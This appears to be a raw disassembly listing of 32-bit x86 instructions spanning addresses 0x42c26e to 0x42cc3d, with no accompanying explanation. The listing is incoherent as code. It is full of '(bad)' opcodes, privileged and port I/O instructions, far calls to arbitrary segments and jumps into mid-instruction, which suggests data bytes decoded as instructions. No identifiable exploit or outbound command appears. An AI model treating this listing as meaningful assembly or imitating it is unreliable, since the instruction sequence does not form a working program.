  42c26e:	fimul  DWORD PTR [ebx-0x67]
  42c271:	test   DWORD PTR [edx+0x2b5e3b6d],ebp
  42c277:	int3   
  42c278:	add    edi,esi
  42c27a:	fs xor al,0x5b
  42c27d:	mov    eax,ds:0x3f3c2cd2
  42c282:	cmc    
  42c283:	cs push es
  42c285:	arpl   WORD PTR [esi-0x20743551],ax
  42c28b:	dec    ecx
  42c28c:	xchg   edx,eax
  42c28d:	or     ebp,edx
  42c28f:	inc    BYTE PTR [esi+0x1f8282ff]
  42c295:	or     eax,0xaa9d8b4c
  42c29a:	and    DWORD PTR ds:0x8b9fdad8,esp
  42c2a0:	sbb    edx,ebp
  42c2a2:	adc    DWORD PTR [ebx+0xb],ebx
  42c2a5:	lock push edx
  42c2a7:	shl    WORD PTR ds:0xb2cc94c8,1
  42c2ae:	cs pop ecx
  42c2b0:	cmp    al,0x40
  42c2b2:	js     0x42c23e
  42c2b4:	jns    0x42c2b6
	...
  42c316:	out    0xf,al
  42c318:	fldcw  WORD PTR [ebp-0x7]
  42c31b:	push   esi
  42c31d:	(bad)  
  42c31e:	adc    esi,DWORD PTR [ebx]
  42c320:	xchg   ebp,eax
  42c321:	sbb    esp,DWORD PTR ds:0x2684296
  42c327:	fld    DWORD PTR [ecx]
  42c329:	add    BYTE PTR [edi],al
  42c32b:	add    DWORD PTR [eax],eax
  42c32d:	add    cl,dh
  42c32f:	jnp    0x42c2fa
  42c331:	mov    edi,0x46bdc3de
  42c336:	in     al,0x52
  42c338:	push   ecx
  42c339:	outs   dx,DWORD PTR ds:[esi]
  42c33a:	xrelease xchg DWORD PTR [eax+0x27a1d7eb],ebp
  42c341:	inc    eax
  42c342:	push   eax
  42c343:	pop    ss
  42c344:	add    al,0xdd
  42c346:	fisttp QWORD PTR [edi]
  42c348:	in     al,0xb6
  42c34a:	jb     0x42c323
  42c34c:	fmul   st(7),st
  42c34e:	mov    ah,0x49
  42c350:	sub    ebx,DWORD PTR [edx]
  42c352:	cs ins DWORD PTR es:[edi],dx
  42c354:	and    eax,0x27607304
  42c359:	jp     0x42c3ce
  42c35b:	int3   
  42c35c:	inc    ebx
  42c35d:	mov    ebp,0x550071ae
  42c362:	sbb    BYTE PTR [ebx],0x94
  42c365:	and    dh,BYTE PTR [esi+ebx*2]
  42c368:	arpl   sp,ax
  42c36a:	or     DWORD PTR [ecx-0x6e],ecx
  42c36d:	int3   
  42c36e:	dec    edx
  42c36f:	int3   
  42c370:	rcr    DWORD PTR [eax],cl
  42c372:	popa   
  42c373:	call   0xe1d5:0x80419e6c
  42c37a:	mov    ebp,0xe674a5bc
  42c37f:	or     al,0xe4
  42c381:	cmp    al,0x59
  42c383:	sub    DWORD PTR ds:0x9276f5b2,esp
  42c389:	lahf   
  42c38a:	pop    edx
  42c38b:	jle    0x42c3b0
  42c38d:	pusha  
  42c38e:	mov    esi,0x153b145b
  42c393:	cmp    DWORD PTR [esi+edi*2],ebp
  42c396:	lahf   
  42c397:	xor    al,0xd9
  42c399:	or     BYTE PTR [ebx-0x7e],0x9b
  42c39d:	mov    al,0xaf
  42c39f:	push   eax
  42c3a0:	xchg   esi,eax
  42c3a1:	test   al,0x65
  42c3a3:	dec    esp
  42c3a4:	ror    DWORD PTR [edx+0x4a347ba9],1
  42c3aa:	jecxz  0x42c3a7
  42c3ac:	pop    esp
  42c3ad:	mov    ebx,0x159722e1
  42c3b2:	or     BYTE PTR [edi+edx*8-0x5a],ah
  42c3b6:	stos   DWORD PTR es:[edi],eax
  42c3b7:	mov    esp,0xf06fdcfc
  42c3bc:	sub    cl,BYTE PTR [ecx]
  42c3be:	pop    ss
  42c3bf:	push   ebp
  42c3c0:	sbb    eax,DWORD PTR [ebp+edx*1-0x226d8af8]
  42c3c7:	jb     0x42c3b7
  42c3c9:	inc    edi
  42c3ca:	sbb    BYTE PTR [ecx],ah
  42c3cc:	cmc    
  42c3cd:	mov    dh,0xdd
  42c3cf:	das    
  42c3d0:	mov    eax,ds:0x29f8b318
  42c3d5:	ss jmp 0x42c381
  42c3d8:	pop    edi
  42c3d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c3da:	push   ss
  42c3db:	jmp    0xac8b404c
  42c3e0:	leave  
  42c3e1:	ficomp WORD PTR [edi]
  42c3e3:	inc    edx
  42c3e4:	leave  
  42c3e5:	mov    WORD PTR [esi],es
  42c3e7:	lds    ebx,FWORD PTR [ecx+0x1ba9e247]
  42c3ed:	xchg   edi,eax
  42c3ee:	xlat   BYTE PTR ds:[ebx]
  42c3ef:	jmp    0xd10d2227
  42c3f4:	ins    DWORD PTR es:[edi],dx
  42c3f5:	sub    ecx,ebp
  42c3f7:	les    ebx,FWORD PTR [edx-0x195736f6]
  42c3fd:	add    BYTE PTR [edi],bl
  42c3ff:	jns    0x42c45b
  42c401:	cmp    al,0x9f
  42c403:	xchg   esi,eax
  42c404:	arpl   WORD PTR [eax-0x2d17771a],cx
  42c40a:	or     eax,0x6de982da
  42c40f:	mov    cs,edx
  42c411:	inc    edx
  42c412:	mov    dh,0x7d
  42c414:	adc    bl,BYTE PTR [ecx-0x44c248f7]
  42c41a:	ror    al,cl
  42c41c:	lods   eax,DWORD PTR ds:[esi]
  42c41d:	outs   dx,DWORD PTR ds:[esi]
  42c41e:	lods   al,BYTE PTR ss:[esi]
  42c420:	add    bl,ch
  42c422:	mov    DWORD PTR [ebp+0x176243fd],0xa23cfe50
  42c42c:	and    edi,DWORD PTR [ebp-0x683e6837]
  42c432:	pop    eax
  42c433:	std    
  42c434:	lock add BYTE PTR [eax],al
	...
  42c493:	add    BYTE PTR [eax],al
  42c495:	add    ah,ch
  42c497:	sbb    ebp,edx
  42c499:	sahf   
  42c49a:	cmc    
  42c49b:	fsubp  st(7),st
  42c49d:	jnp    0x42c473
  42c49f:	push   esi
  42c4a1:	xor    BYTE PTR [edx+0x9425e4d],al
  42c4a7:	fiadd  DWORD PTR [ecx]
  42c4a9:	add    BYTE PTR [edi],al
  42c4ab:	add    DWORD PTR [eax],eax
  42c4ad:	add    BYTE PTR [ebx+ecx*8-0x2388b6af],ah
  42c4b4:	popa   
  42c4b5:	in     al,0x7c
  42c4b7:	xlat   BYTE PTR ds:[ebx]
  42c4b8:	cmp    BYTE PTR [edx-0x461e749d],bl
  42c4be:	or     al,0xfd
  42c4c0:	push   0xffffffc3
  42c4c2:	mov    ah,0x95
  42c4c4:	pop    esi
  42c4c5:	loopne 0x42c486
  42c4c7:	mov    bh,0xa9
  42c4c9:	xlat   BYTE PTR ds:[ebx]
  42c4ca:	xor    dl,BYTE PTR [ecx+0x3614c2c1]
  42c4d0:	xor    bh,dl
  42c4d2:	adc    edi,0xe60aea8c
  42c4d8:	popa   
  42c4d9:	inc    edx
  42c4da:	jmp    DWORD PTR [esp+eiz*2-0x3a1eb264]
  42c4e1:	fisttp DWORD PTR [bp-0x7c]
  42c4e5:	inc    ebx
  42c4e6:	les    edi,FWORD PTR [ebx+0x7b1579f5]
  42c4ec:	ins    BYTE PTR es:[edi],dx
  42c4ed:	pop    eax
  42c4ee:	enter  0xc119,0x36
  42c4f2:	arpl   WORD PTR [edx+ecx*2+0x36],di
  42c4f6:	scas   eax,DWORD PTR es:[edi]
  42c4f7:	jo     0x42c4ca
  42c4f9:	pop    edx
  42c4fa:	and    dl,BYTE PTR [esi-0x587e149e]
  42c500:	add    al,0xd5
  42c502:	sub    bl,0x5e
  42c505:	fstp   DWORD PTR [edx+0x54]
  42c508:	mov    ecx,0x776feded
  42c50d:	jmp    0x42c4dd
  42c50f:	cmp    esp,ecx
  42c511:	sub    eax,0x33a052b9
  42c516:	(bad)  
  42c517:	cmp    esp,DWORD PTR [eax-0x70]
  42c51a:	add    ebx,DWORD PTR [edi]
  42c51c:	xchg   ebx,eax
  42c51d:	xchg   edi,eax
  42c51e:	mov    edi,0x136f334b
  42c523:	loop   0x42c4a6
  42c525:	or     dh,0xe0
  42c528:	loop   0x42c517
  42c52a:	jnp    0x42c4f7
  42c52c:	push   eax
  42c52d:	mov    edi,0xf77b9a95
  42c532:	or     eax,0x54e0d032
  42c537:	lods   al,BYTE PTR fs:[esi]
  42c539:	(bad)  [eax+0x77]
  42c53c:	adc    BYTE PTR [ebp+0x2b],bh
  42c53f:	jbe    0x42c4fa
  42c541:	cmc    
  42c542:	inc    edi
  42c543:	(bad)  
  42c544:	push   ds
  42c545:	(bad)  
  42c546:	jb     0x42c5c1
  42c548:	pop    ebp
  42c549:	fwait
  42c54a:	push   edx
  42c54b:	and    DWORD PTR [edi-0x56482609],ebx
  42c551:	push   cs
  42c552:	das    
  42c553:	mov    dl,0xb5
  42c555:	fwait
  42c556:	sti    
  42c557:	jg     0x42c5c6
  42c559:	sahf   
  42c55a:	outs   dx,DWORD PTR ds:[esi]
  42c55b:	js     0x42c568
  42c55d:	cmp    bh,cl
  42c55f:	xchg   esi,eax
  42c560:	std    
  42c561:	cmp    dl,bl
  42c563:	ins    BYTE PTR es:[edi],dx
  42c564:	mov    esp,0x5e541e9d
  42c569:	cmp    eax,0xb14a942d
  42c56e:	mov    ecx,0x43157f4a
  42c573:	push   ebp
  42c574:	push   ecx
  42c575:	(bad)  
  42c576:	rcr    eax,1
  42c578:	(bad)  
  42c579:	iret   
  42c57a:	retf   0xb8b4
  42c57d:	shr    DWORD PTR [edx],cl
  42c57f:	mov    ecx,fs
  42c581:	bound  ecx,QWORD PTR [edi+ebx*2+0x60]
  42c585:	pop    esp
  42c586:	icebp  
  42c587:	into   
  42c588:	and    ah,dl
  42c58a:	rol    DWORD PTR [ebx+0x5ba107f8],cl
  42c590:	adc    eax,0x77f5874b
  42c595:	repnz mov BYTE PTR [eax],bh
  42c598:	sub    ebp,DWORD PTR [edx+0x297c1342]
  42c59e:	xlat   BYTE PTR ds:[ebx]
  42c59f:	mov    ecx,0x370ec5f8
  42c5a4:	mul    DWORD PTR [esi-0x6]
  42c5a7:	and    DWORD PTR [eax+eax*1-0x6819d54],edi
  42c5ae:	shl    ecx,1
  42c5b0:	test   al,0x68
  42c5b2:	adc    ch,BYTE PTR [esi]
  42c5b4:	test   eax,0x0
	...
  42c615:	add    BYTE PTR [ebp+0x48],bl
  42c618:	jle    0x42c5a8
  42c61a:	jg     0x42c5da
  42c61c:	std    
  42c61d:	fisttp DWORD PTR [edi-0x31]
  42c620:	inc    eax
  42c621:	push   edi
  42c622:	mov    bh,0xcd
  42c624:	add    al,0x5b
  42c626:	adc    bl,bl
  42c628:	add    DWORD PTR [eax],eax
  42c62a:	pop    es
  42c62b:	add    DWORD PTR [eax],eax
  42c62d:	add    BYTE PTR [edi],dl
  42c62f:	cmp    DWORD PTR [esi],esp
  42c631:	mov    WORD PTR [ecx+0x43],?
  42c634:	mov    bh,0xeb
  42c636:	or     esp,DWORD PTR [edx+0x422fd81a]
  42c63c:	mov    edi,0x3b32bae5
  42c641:	aam    0xf9
  42c643:	cwde   
  42c644:	sub    dl,dh
  42c646:	push   edi
  42c647:	mov    al,0x3f
  42c649:	loope  0x42c693
  42c64b:	xchg   ecx,eax
  42c64c:	bound  eax,QWORD PTR [edi+0x53e4ecba]
  42c652:	sub    al,0x1d
  42c654:	push   0xffffffd2
  42c656:	(bad)  
  42c658:	loop   0x42c67a
  42c65a:	(bad)  
  42c65b:	cli    
  42c65c:	or     al,0x84
  42c65e:	mov    cl,0x0
  42c660:	call   0xa9eb5cb2
  42c665:	lahf   
  42c666:	mov    dh,0x7c
  42c668:	cld    
  42c669:	neg    DWORD PTR [eax+0x16]
  42c66c:	or     bh,BYTE PTR [edx+eiz*2]
  42c66f:	mov    ch,0xb9
  42c671:	retf   
  42c672:	push   edi
  42c673:	sbb    DWORD PTR [ecx],ebp
  42c675:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c676:	dec    ebx
  42c677:	jle    0x42c6da
  42c679:	imul   esp,DWORD PTR [edx-0x3],0x13
  42c67d:	dec    eax
  42c67e:	mov    dh,0xed
  42c680:	dec    edi
  42c681:	jge    0x42c60b
  42c683:	fdivp  st(7),st
  42c685:	call   0x953a:0x826ebc24
  42c68c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c68d:	cs stc 
  42c68f:	xor    DWORD PTR [esi+0x5a],eax
  42c692:	jmp    0x42c669
  42c694:	gs aaa 
  42c696:	lock aam 0x36
  42c699:	ror    BYTE PTR [ebx],0x9f
  42c69c:	inc    eax
  42c69d:	jo     0x42c6bd
  42c69f:	dec    dx
  42c6a1:	rcr    BYTE PTR [eax+0x45585ae7],cl
  42c6a7:	imul   ebx,DWORD PTR [ebx],0xfffffff8
  42c6aa:	sbb    eax,0x313e7ea6
  42c6af:	sbb    DWORD PTR [eax+0x13],esi
  42c6b2:	pop    ds
  42c6b3:	je     0x42c70e
  42c6b5:	inc    esi
  42c6b6:	pop    es
  42c6b7:	mov    DWORD PTR [ecx+0x746076be],eax
  42c6bd:	(bad)  
  42c6be:	sbb    al,0x9c
  42c6c0:	pop    ebx
  42c6c1:	sbb    BYTE PTR ds:0x829143ed,al
  42c6c7:	(bad)
  42c6ca:	dec    ebp
  42c6cb:	dec    edx
  42c6cc:	pop    esp
  42c6cd:	rcr    BYTE PTR [edx],cl
  42c6cf:	push   edx
  42c6d0:	xor    BYTE PTR [edi+0x8],0x5a
  42c6d4:	scas   al,BYTE PTR es:[edi]
  42c6d5:	dec    edx
  42c6d6:	and    al,0x6f
  42c6d8:	mov    ds:0x3af478f6,al
  42c6dd:	loopne 0x42c744
  42c6df:	(bad)  
  42c6e0:	mov    edi,0xbb9a369a
  42c6e5:	call   0xe281:0x962c613a
  42c6ec:	jnp    0x42c698
  42c6ee:	es mov edi,0x515165f2
  42c6f4:	push   esi
  42c6f5:	xchg   esi,eax
  42c6f6:	leave  
  42c6f7:	sub    eax,0xdc772535
  42c6fc:	in     eax,0xaf
  42c6fe:	push   ebx
  42c6ff:	fcmovbe st,st(7)
  42c701:	push   eax
  42c702:	nop
  42c703:	pushf  
  42c704:	cdq    
  42c705:	scas   eax,DWORD PTR es:[edi]
  42c706:	aad    0xcc
  42c708:	test   BYTE PTR [eax+eax*8+0x7],0x88
  42c70d:	cmc    
  42c70e:	test   DWORD PTR [ecx+edi*2],edi
  42c711:	and    DWORD PTR [ebx-0x6972ef57],edi
  42c717:	test   al,0x33
  42c719:	dec    edi
  42c71a:	int3   
  42c71b:	lock sub ch,BYTE PTR [esi-0x48e17ad2]
  42c722:	cmp    eax,0x2f699a27
  42c727:	dec    ecx
  42c728:	aad    0x3c
  42c72a:	jno    0x42c7ab
  42c72c:	dec    edi
  42c72d:	int    0x41
  42c72f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  42c731:	mov    fs,WORD PTR [edi+0x669c]
	...
  42c793:	add    BYTE PTR [eax],al
  42c795:	add    BYTE PTR [eax],bh
  42c797:	mov    DWORD PTR [edx-0x6b],ebp
  42c79a:	sti    
  42c79b:	idiv   edi
  42c79d:	lods   eax,DWORD PTR ds:[esi]
  42c79e:	push   ss
  42c79f:	mov    al,ds:0x8293f90
  42c7a4:	add    DWORD PTR [ecx],edi
  42c7a6:	pop    ss
  42c7a7:	fadd   QWORD PTR [ecx]
  42c7a9:	add    BYTE PTR [edi],al
  42c7ab:	add    DWORD PTR [eax],eax
  42c7ad:	add    BYTE PTR [edx-0x52],ah
  42c7b0:	jmp    0xeaa5:0x5cdb42ad
  42c7b7:	sub    DWORD PTR fs:[edx],esp
  42c7ba:	jecxz  0x42c79b
  42c7bc:	push   0xf09d989e
  42c7c1:	repnz adc DWORD PTR es:[edx+0x67],ecx
  42c7c6:	ins    DWORD PTR es:[edi],dx
  42c7c7:	outs   dx,BYTE PTR ds:[esi]
  42c7c8:	mov    bl,ah
  42c7ca:	(bad)  
  42c7cb:	cmp    al,0x9f
  42c7cd:	sub    ebx,DWORD PTR [edi-0x587b5370]
  42c7d3:	out    0xee,al
  42c7d5:	out    dx,eax
  42c7d6:	sub    al,0x8e
  42c7d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c7d9:	and    DWORD PTR [ebx+0x58a40340],edx
  42c7df:	mov    ds:0x9e4544be,eax
  42c7e4:	inc    ebx
  42c7e5:	or     BYTE PTR [edx-0xf08fc3e],cl
  42c7eb:	aaa    
  42c7ec:	jl     0x42c785
  42c7ee:	arpl   WORD PTR [ebx+esi*4+0x715c6be0],di
  42c7f5:	aam    0x9b
  42c7f7:	cs daa 
  42c7f9:	pop    esp
  42c7fa:	aad    0x8f
  42c7fc:	ins    DWORD PTR es:[edi],dx
  42c7fd:	mov    DWORD PTR [edi+0x67],ebx
  42c800:	jl     0x42c7f2
  42c802:	cmp    BYTE PTR [esi*2-0x243b1e09],al
  42c809:	(bad)  [eax+0x1]
  42c80c:	push   ebp
  42c80d:	pop    esi
  42c80e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c80f:	fmul   st,st(1)
  42c811:	ret    0xf88e
  42c814:	inc    ebp
  42c815:	mov    bl,bh
  42c817:	out    dx,eax
  42c818:	inc    ebp
  42c819:	in     al,dx
  42c81a:	mov    dl,0xe1
  42c81c:	jbe    0x42c812
  42c81e:	jge    0x42c7a2
  42c820:	mov    dh,BYTE PTR [edi+eiz*2+0x6b]
  42c824:	or     BYTE PTR [esi-0x42],al
  42c827:	jmp    0xd8a5:0x69e7896c
  42c82e:	call   0xea5f:0x6091b3cd
  42c835:	jnp    0x42c868
  42c837:	nop
  42c838:	fnsave [eax]
  42c83a:	mov    ds:0xd9753931,eax
  42c83f:	xchg   esp,eax
  42c840:	or     DWORD PTR ds:0x7aab8060,esi
  42c846:	pop    edx
  42c847:	xchg   ecx,eax
  42c848:	jp     0x42c801
  42c84a:	and    BYTE PTR [eax],dl
  42c84c:	das    
  42c84d:	fwait
  42c84e:	mov    dh,0x9a
  42c850:	int3   
  42c851:	into   
  42c852:	mov    BYTE PTR [ecx+esi*8-0x40fcdbf3],cl
  42c859:	sub    DWORD PTR [edi],0x23
  42c85c:	mov    cl,0x62
  42c85e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c85f:	js     0x42c876
  42c861:	jne    0x42c855
  42c863:	xor    eax,0xf8f2b0
  42c868:	cs std 
  42c86a:	lods   eax,DWORD PTR ds:[esi]
  42c86b:	xor    ah,BYTE PTR [eax-0x6fd0969f]
  42c871:	pop    ds
  42c872:	mov    WORD PTR [esi],?
  42c874:	(bad)  
  42c875:	neg    DWORD PTR [ebx]
  42c877:	add    BYTE PTR [ecx+0x1b],cl
  42c87a:	sti    
  42c87b:	jne    0x42c865
  42c87d:	push   ebp
  42c87e:	fiadd  WORD PTR [ecx]
  42c880:	add    edi,DWORD PTR [ecx-0x5f]
  42c883:	repnz mov cl,0xe6
  42c886:	and    ebp,esi
  42c888:	hlt    
  42c889:	sahf   
  42c88a:	add    BYTE PTR [esi-0x53a38356],0x23
  42c891:	mov    esp,0x858bdae5
  42c896:	shl    DWORD PTR [bx-0x11],0x3b
  42c89b:	pop    ebp
  42c89c:	push   ss
  42c89d:	push   0xc
  42c89f:	test   al,0x21
  42c8a1:	inc    esp
  42c8a2:	test   eax,0xf2ad8295
  42c8a7:	cmp    BYTE PTR [edi],dh
  42c8a9:	ins    BYTE PTR es:[edi],dx
  42c8aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c8ab:	sbb    BYTE PTR [edi-0x2d8f9b02],dh
  42c8b1:	call   0x0:0xffb8b2
	...
  42c914:	add    BYTE PTR [eax],al
  42c916:	adc    BYTE PTR [ebx],bl
  42c918:	leave  
  42c919:	jmp    0xfb73c4e9
  42c91e:	addr16 mov ds:0xa954,al
  42c922:	in     al,dx
  42c923:	fisttp QWORD PTR [edi+0x1e]
  42c926:	push   ds
  42c927:	fld    QWORD PTR [ecx]
  42c929:	add    BYTE PTR [edi],al
  42c92b:	add    DWORD PTR [eax],eax
  42c92d:	add    BYTE PTR [edx-0x55db4177],dl
  42c933:	sub    esi,DWORD PTR [eax+0x6a]
  42c936:	mov    eax,fs:0xf9021192
  42c93c:	sbb    esp,esi
  42c93e:	lock (bad) 
  42c940:	outs   dx,BYTE PTR ds:[esi]
  42c941:	pop    es
  42c942:	xchg   edi,eax
  42c943:	pusha  
  42c944:	mov    ecx,DWORD PTR [ecx]
  42c946:	and    al,0x61
  42c948:	or     al,0x6a
  42c94b:	jbe    0x42c9ae
  42c94d:	pop    ds
  42c94e:	sub    BYTE PTR [ecx],0xc5
  42c951:	stc    
  42c952:	in     al,dx
  42c953:	loopne 0x42c950
  42c955:	jo     0x42c8d7
  42c957:	push   edx
  42c958:	shl    DWORD PTR [esi-0x51],0xd
  42c95c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42c95d:	push   cs
  42c95e:	mov    dl,0xdc
  42c960:	pop    ss
  42c961:	sbb    bl,bl
  42c963:	retf   
  42c964:	sbb    al,0xcc
  42c966:	ds push edx
  42c968:	test   DWORD PTR [ebp-0x8a04b95],esi
  42c96e:	adc    eax,0xb988c727
  42c973:	sbb    al,0x24
  42c975:	out    0x9e,eax
  42c977:	push   0xffffff8b
  42c979:	sti    
  42c97a:	icebp  
  42c97b:	mov    dh,BYTE PTR [ebx-0x49]
  42c97e:	sub    eax,0x4dd21beb
  42c983:	fdivrp st(3),st
  42c985:	pop    ebp
  42c986:	leave  
  42c987:	jl     0x42c999
  42c989:	xchg   esp,eax
  42c98a:	(bad)  
  42c98b:	je     0x42c98c
  42c98d:	int3   
  42c98e:	das    
  42c98f:	and    BYTE PTR [ebx],0xeb
  42c992:	sub    al,0xc4
  42c994:	xchg   BYTE PTR [esi],al
  42c996:	adc    bl,al
  42c998:	push   cs
  42c999:	mov    dl,0x62
  42c99b:	scas   al,BYTE PTR es:[edi]
  42c99c:	mov    esp,DWORD PTR [esi]
  42c99e:	icebp  
  42c99f:	lds    edi,FWORD PTR [ebx-0x6c]
  42c9a2:	call   0xad85fb98
  42c9a7:	aaa    
  42c9a8:	in     eax,0xd4
  42c9aa:	ror    BYTE PTR [edi],0xfd
  42c9ad:	int    0x13
  42c9af:	sar    DWORD PTR [ecx-0x3b0e4e4e],1
  42c9b5:	jmp    0x3f3b:0x10d98746
  42c9bc:	jmp    0xe572:0x905a6a5c
  42c9c3:	adc    DWORD PTR [esi+0x463d9635],ebx
  42c9c9:	(bad)  
  42c9ca:	cmc    
  42c9cb:	cmp    ebp,DWORD PTR [ecx-0x59]
  42c9ce:	jnp    0x42ca47
  42c9d0:	popa   
  42c9d1:	mov    dl,0xf4
  42c9d3:	sbb    BYTE PTR [ecx+0x2a],bl
  42c9d6:	fcmovnb st,st(5)
  42c9d8:	scas   eax,DWORD PTR es:[edi]
  42c9d9:	xchg   esp,eax
  42c9da:	daa    
  42c9db:	std    
  42c9dc:	adc    eax,0xa6a112e3
  42c9e1:	jmp    0x61895320
  42c9e6:	or     BYTE PTR [esi],bh
  42c9e8:	and    eax,ebx
  42c9ea:	mov    edi,0x3b44ca5d
  42c9ef:	icebp  
  42c9f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9f1:	jno    0x42c9c2
  42c9f3:	sysenter 
  42c9f5:	into   
  42c9f6:	(bad)  
  42c9f7:	mov    esi,0x745130d2
  42c9fc:	iret   
  42c9fd:	lea    ebp,[eax]
  42c9ff:	xlat   BYTE PTR ds:[ebx]
  42ca00:	test   BYTE PTR [ebx],0xf
  42ca03:	fistp  WORD PTR [ecx]
  42ca05:	std    
  42ca06:	xchg   edi,eax
  42ca07:	loopne 0x42ca22
  42ca09:	push   esi
  42ca0a:	xchg   esp,eax
  42ca0b:	std    
  42ca0c:	or     ebp,DWORD PTR [edx]
  42ca0e:	shl    BYTE PTR [edi+0x5d2e0efa],cl
  42ca14:	jecxz  0x42ca88
  42ca16:	ds (bad) 
  42ca19:	das    
  42ca1a:	retf   
  42ca1b:	daa    
  42ca1c:	push   esi
  42ca1d:	lea    ecx,[esi+0x1]
  42ca20:	gs aam 0x35
  42ca23:	outs   dx,BYTE PTR ds:[esi]
  42ca24:	adc    edx,DWORD PTR [ebp-0x67]
  42ca27:	jp     0x42ca8c
  42ca29:	add    BYTE PTR [ebp-0x41],bl
  42ca2c:	and    al,dl
  42ca2e:	jg     0x42ca8f
  42ca30:	mov    ebp,0xfda98108
	...
  42ca95:	add    BYTE PTR [edi-0x2be7726],ah
  42ca9b:	push   ebx
  42ca9c:	out    dx,eax
  42ca9d:	(bad)  
  42ca9e:	jb     0x42cab7
  42caa0:	shr    DWORD PTR ds:0x3b2d4856,1
  42caa6:	and    eax,0x70001de
  42caab:	add    DWORD PTR [eax],eax
  42caad:	add    BYTE PTR [eax],bl
  42caaf:	dec    edx
  42cab0:	inc    esp
  42cab1:	mov    WORD PTR [esp+ebp*8+0x730a83e5],?
  42cab8:	xchg   ebx,eax
  42cab9:	mov    BYTE PTR [eax+ecx*1],bh
  42cabc:	sar    DWORD PTR ds:0x59891482,0x82
  42cac3:	fld    DWORD PTR [edi+eiz*1-0x499ec075]
  42caca:	push   ecx
  42cacb:	fwait
  42cacc:	mov    cl,0xb5
  42cace:	aad    0x3
  42cad0:	mov    ?,eax
  42cad2:	cmp    ebx,DWORD PTR [edx+0x13]
  42cad5:	aam    0xfc
  42cad7:	xor    BYTE PTR [ecx+0x515dee71],cl
  42cadd:	out    dx,eax
  42cade:	es scas eax,DWORD PTR es:[edi]
  42cae0:	mov    ebx,0xb672a2a1
  42cae5:	inc    ebx
  42cae6:	in     eax,0x7f
  42cae8:	adc    dl,ah
  42caea:	xor    DWORD PTR [ebx-0x79cd2724],ebp
  42caf0:	pushf  
  42caf1:	jp     0x42cb15
  42caf3:	pop    esi
  42caf4:	in     eax,dx
  42caf5:	mov    edi,0x2b0313b6
  42cafa:	add    eax,0x4513ab99
  42caff:	outs   dx,DWORD PTR ds:[esi]
  42cb00:	ror    esp,0xe5
  42cb03:	dec    edi
  42cb04:	cli    
  42cb05:	sbb    dl,bl
  42cb07:	jno    0x42cb18
  42cb09:	fild   DWORD PTR [ebx+0x7b5cc18f]
  42cb0f:	push   eax
  42cb10:	push   edi
  42cb11:	mov    edi,0x37fd1ce0
  42cb16:	rol    DWORD PTR [edx+0x44],cl
  42cb19:	mov    bh,0x3f
  42cb1b:	and    al,0xd3
  42cb1d:	jb     0x42cb71
  42cb1f:	or     edx,esi
  42cb21:	test   al,0x5
  42cb23:	push   ds
  42cb24:	daa    
  42cb25:	and    ebx,DWORD PTR [edi-0x62]
  42cb28:	test   DWORD PTR [ebx-0xa],edi
  42cb2b:	cmc    
  42cb2c:	mov    dl,0x4e
  42cb2e:	bound  ebx,QWORD PTR [edi-0x220330f4]
  42cb34:	jne    0x42cb9a
  42cb36:	or     ah,BYTE PTR [ebx+0x603d8df6]
  42cb3c:	fcom   DWORD PTR [esi+edx*2+0x16ee5ab2]
  42cb43:	jnp    0x42cafb
  42cb45:	and    DWORD PTR [ecx],ecx
  42cb47:	cmp    DWORD PTR [edx-0x3e25db42],0xb5865002
  42cb51:	pop    ds
  42cb52:	add    DWORD PTR [esi-0x27],esp
  42cb55:	lods   al,BYTE PTR ds:[esi]
  42cb56:	retf   0x6dc
  42cb59:	jl     0x42cb24
  42cb5b:	pop    ebp
  42cb5c:	int3   
  42cb5d:	add    ah,BYTE PTR [edi+0x5c]
  42cb60:	mov    ecx,DWORD PTR [ecx]
  42cb62:	push   ebp
  42cb63:	cmp    eax,0x4e3c3847
  42cb68:	mov    eax,ds:0xaef023b3
  42cb6d:	cwde   
  42cb6e:	fwait
  42cb6f:	mov    ch,0x9d
  42cb71:	(bad)  
  42cb72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cb73:	jecxz  0x42cb23
  42cb75:	das    
  42cb76:	popf   
  42cb77:	sbb    al,0xca
  42cb79:	pop    ds
  42cb7a:	mov    esp,cs
  42cb7c:	sar    BYTE PTR [edi-0x23],0x24
  42cb80:	inc    esi
  42cb81:	jge    0x42cb6a
  42cb83:	or     DWORD PTR [eax],ebp
  42cb85:	pushf  
  42cb86:	inc    eax
  42cb87:	xchg   ebp,eax
  42cb88:	add    DWORD PTR [eax],esi
  42cb8a:	cli    
  42cb8b:	fimul  DWORD PTR [esi-0x65]
  42cb8e:	or     dl,dl
  42cb90:	in     al,dx
  42cb91:	adc    dl,BYTE PTR [ebx]
  42cb93:	inc    ebx
  42cb94:	xchg   esi,eax
  42cb95:	mov    ah,0x1c
  42cb97:	jbe    0x42cb79
  42cb99:	cmp    DWORD PTR [edi],eax
  42cb9b:	pop    ss
  42cb9c:	dec    ebp
  42cb9d:	pop    esp
  42cb9e:	or     al,0xd5
  42cba0:	mov    esp,0x619a9fb6
  42cba5:	ss loop 0x42cb8a
  42cba8:	cmp    BYTE PTR [eax-0x77],0x62
  42cbac:	dec    esi
  42cbad:	test   eax,0xf78e0203
  42cbb2:	xchg   ebp,eax
  42cbb3:	out    0xc2,al
	...
  42cc15:	add    BYTE PTR [edi+0x2],bh
  42cc18:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc1c:	call   FWORD PTR [ebx]
  42cc1e:	iret   
  42cc1f:	mov    dl,0xde
  42cc21:	stc    
  42cc22:	out    0x63,eax
  42cc24:	fs test eax,0x1df2c
  42cc2a:	pop    es
  42cc2b:	add    DWORD PTR [eax],eax
  42cc2d:	add    BYTE PTR [ebx-0x9],dh
  42cc30:	xchg   esp,eax
  42cc31:	xchg   esp,eax
  42cc32:	mov    bl,0xef
  42cc34:	addr16 xchg edi,eax
  42cc36:	(bad)  
  42cc37:	cmp    eax,0x93e8ac94
  42cc3c:	stos   DWORD PTR es:[edi],eax
  42cc3d:	push   ds
